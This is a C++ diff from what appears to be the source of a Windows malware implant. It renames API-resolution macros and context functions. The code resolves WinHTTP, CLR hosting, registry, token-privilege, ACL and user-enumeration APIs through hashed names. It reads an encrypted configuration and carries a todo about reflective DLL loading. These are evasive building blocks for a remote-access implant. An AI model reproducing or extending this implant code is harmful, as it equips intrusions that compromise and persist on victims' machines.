@@ -35,7 +35,7 @@ namespace Implant {
         } while (ntstatus != ERROR_EXIT);
 
     defer:
-        Memory::ContextDelete(Ctx);
+        Memory::Context::ContextDestroy(Ctx);
     }
 
     VOID ReadConfig() {
@@ -52,7 +52,7 @@ namespace Implant {
         //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->Config.Key, FALSE);
         // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
 
-        if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
+        if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
                 !(Ctx->Modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
                 !(Ctx->Modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
@@ -67,39 +67,39 @@ namespace Implant {
         }
 
         if (
-            !(FPTR(Ctx->CLR.CLRCreateInstance,              Ctx->Modules.mscoree, CLRCREATEINSTANCE)) ||
-            !(FPTR(Ctx->win32.WinHttpOpen,                  Ctx->Modules.winhttp, WINHTTPOPEN)) ||
-            !(FPTR(Ctx->win32.WinHttpConnect,               Ctx->Modules.winhttp, WINHTTPCONNECT)) ||
-            !(FPTR(Ctx->win32.WinHttpOpenRequest,           Ctx->Modules.winhttp, WINHTTPOPENREQUEST)) ||
-            !(FPTR(Ctx->win32.WinHttpAddRequestHeaders,     Ctx->Modules.winhttp, WINHTTPADDREQUESTHEADERS)) ||
-            !(FPTR(Ctx->win32.WinHttpSetOption,             Ctx->Modules.winhttp, WINHTTPSETOPTION)) ||
-            !(FPTR(Ctx->win32.WinHttpGetProxyForUrl,        Ctx->Modules.winhttp, WINHTTPGETPROXYFORURL)) ||
-            !(FPTR(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->Modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER)) ||
-            !(FPTR(Ctx->win32.WinHttpSendRequest,           Ctx->Modules.winhttp, WINHTTPSENDREQUEST)) ||
-            !(FPTR(Ctx->win32.WinHttpReceiveResponse,       Ctx->Modules.winhttp, WINHTTPRECEIVERESPONSE)) ||
-            !(FPTR(Ctx->win32.WinHttpReadData,              Ctx->Modules.winhttp, WINHTTPREADDATA)) ||
-            !(FPTR(Ctx->win32.WinHttpQueryHeaders,          Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
-            !(FPTR(Ctx->win32.WinHttpQueryDataAvailable,    Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
-            !(FPTR(Ctx->win32.WinHttpCloseHandle,           Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
-            !(FPTR(Ctx->win32.GetAdaptersInfo,              Ctx->Modules.iphlpapi, GETADAPTERSINFO)) ||
-            !(FPTR(Ctx->win32.CryptStringToBinaryA,         Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
-            !(FPTR(Ctx->win32.CryptBinaryToStringA,         Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
-            !(FPTR(Ctx->win32.GetUserNameA,                 Ctx->Modules.advapi, GETUSERNAMEA)) ||
-            !(FPTR(Ctx->win32.LookupAccountSidW,            Ctx->Modules.advapi, LOOKUPACCOUNTSIDW)) ||
-            !(FPTR(Ctx->win32.LookupPrivilegeValueA,        Ctx->Modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
-            !(FPTR(Ctx->win32.SetEntriesInAclA,             Ctx->Modules.advapi, SETENTRIESINACLA)) ||
-            !(FPTR(Ctx->win32.AllocateAndInitializeSid,     Ctx->Modules.advapi, ALLOCATEANDINITIALIZESID)) ||
-            !(FPTR(Ctx->win32.AddMandatoryAce,              Ctx->Modules.advapi, ADDMANDATORYACE)) ||
-            !(FPTR(Ctx->win32.InitializeSecurityDescriptor, Ctx->Modules.advapi, INITIALIZESECURITYDESCRIPTOR)) ||
-            !(FPTR(Ctx->win32.InitializeAcl,                Ctx->Modules.advapi, INITIALIZEACL)) ||
-            !(FPTR(Ctx->win32.SetSecurityDescriptorDacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
-            !(FPTR(Ctx->win32.SetSecurityDescriptorSacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
-            !(FPTR(Ctx->win32.RegOpenKeyExA,                Ctx->Modules.advapi, REGOPENKEYEXA)) ||
-            !(FPTR(Ctx->win32.RegCreateKeyExA,              Ctx->Modules.advapi, REGCREATEKEYEXA)) ||
-            !(FPTR(Ctx->win32.RegSetValueExA,               Ctx->Modules.advapi, REGSETVALUEEXA)) ||
-            !(FPTR(Ctx->win32.RegCloseKey,                  Ctx->Modules.advapi, REGCLOSEKEY)) ||
-            !(FPTR(Ctx->win32.AdjustTokenPrivileges,        Ctx->Modules.advapi, ADJUSTTOKENPRIVILEGES)) ||
-            !(FPTR(Ctx->win32.FreeSid,                      Ctx->Modules.advapi, FREESID))) {
+            !(F_PTR_HMOD(Ctx->CLR.CLRCreateInstance,              Ctx->Modules.mscoree, CLRCREATEINSTANCE)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpOpen,                  Ctx->Modules.winhttp, WINHTTPOPEN)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpConnect,               Ctx->Modules.winhttp, WINHTTPCONNECT)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpOpenRequest,           Ctx->Modules.winhttp, WINHTTPOPENREQUEST)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpAddRequestHeaders,     Ctx->Modules.winhttp, WINHTTPADDREQUESTHEADERS)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpSetOption,             Ctx->Modules.winhttp, WINHTTPSETOPTION)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpGetProxyForUrl,        Ctx->Modules.winhttp, WINHTTPGETPROXYFORURL)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->Modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpSendRequest,           Ctx->Modules.winhttp, WINHTTPSENDREQUEST)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpReceiveResponse,       Ctx->Modules.winhttp, WINHTTPRECEIVERESPONSE)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpReadData,              Ctx->Modules.winhttp, WINHTTPREADDATA)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpQueryHeaders,          Ctx->Modules.winhttp, WINHTTPQUERYHEADERS)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpQueryDataAvailable,    Ctx->Modules.winhttp, WINHTTPQUERYDATAAVAILABLE)) ||
+            !(F_PTR_HMOD(Ctx->win32.WinHttpCloseHandle,           Ctx->Modules.winhttp, WINHTTPCLOSEHANDLE)) ||
+            !(F_PTR_HMOD(Ctx->win32.GetAdaptersInfo,              Ctx->Modules.iphlpapi, GETADAPTERSINFO)) ||
+            !(F_PTR_HMOD(Ctx->win32.CryptStringToBinaryA,         Ctx->Modules.crypt32, CRYPTSTRINGTOBINARYA)) ||
+            !(F_PTR_HMOD(Ctx->win32.CryptBinaryToStringA,         Ctx->Modules.crypt32, CRYPTBINARYTOSTRINGA)) ||
+            !(F_PTR_HMOD(Ctx->win32.GetUserNameA,                 Ctx->Modules.advapi, GETUSERNAMEA)) ||
+            !(F_PTR_HMOD(Ctx->win32.LookupAccountSidW,            Ctx->Modules.advapi, LOOKUPACCOUNTSIDW)) ||
+            !(F_PTR_HMOD(Ctx->win32.LookupPrivilegeValueA,        Ctx->Modules.advapi, LOOKUPPRIVILEGEVALUEA)) ||
+            !(F_PTR_HMOD(Ctx->win32.SetEntriesInAclA,             Ctx->Modules.advapi, SETENTRIESINACLA)) ||
+            !(F_PTR_HMOD(Ctx->win32.AllocateAndInitializeSid,     Ctx->Modules.advapi, ALLOCATEANDINITIALIZESID)) ||
+            !(F_PTR_HMOD(Ctx->win32.AddMandatoryAce,              Ctx->Modules.advapi, ADDMANDATORYACE)) ||
+            !(F_PTR_HMOD(Ctx->win32.InitializeSecurityDescriptor, Ctx->Modules.advapi, INITIALIZESECURITYDESCRIPTOR)) ||
+            !(F_PTR_HMOD(Ctx->win32.InitializeAcl,                Ctx->Modules.advapi, INITIALIZEACL)) ||
+            !(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorDacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORDACL)) ||
+            !(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorSacl,    Ctx->Modules.advapi, SETSECURITYDESCRIPTORSACL)) ||
+            !(F_PTR_HMOD(Ctx->win32.RegOpenKeyExA,                Ctx->Modules.advapi, REGOPENKEYEXA)) ||
+            !(F_PTR_HMOD(Ctx->win32.RegCreateKeyExA,              Ctx->Modules.advapi, REGCREATEKEYEXA)) ||
+            !(F_PTR_HMOD(Ctx->win32.RegSetValueExA,               Ctx->Modules.advapi, REGSETVALUEEXA)) ||
+            !(F_PTR_HMOD(Ctx->win32.RegCloseKey,                  Ctx->Modules.advapi, REGCLOSEKEY)) ||
+            !(F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,        Ctx->Modules.advapi, ADJUSTTOKENPRIVILEGES)) ||
+            !(F_PTR_HMOD(Ctx->win32.FreeSid,                      Ctx->Modules.advapi, FREESID))) {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
@@ -156,10 +156,9 @@ namespace Implant {
 
 VOID Entrypoint(HMODULE Base) {
 
-    NT_ASSERT(Memory::ContextInit());
-    NT_ASSERT(Memory::ResolveApi());
+    NT_ASSERT(Memory::Context::ContextInit());
+    NT_ASSERT(Memory::Context::ResolveApi());
     NT_ASSERT(Implant::ReadConfig());
-
     Implant::MainRoutine();
 }
 
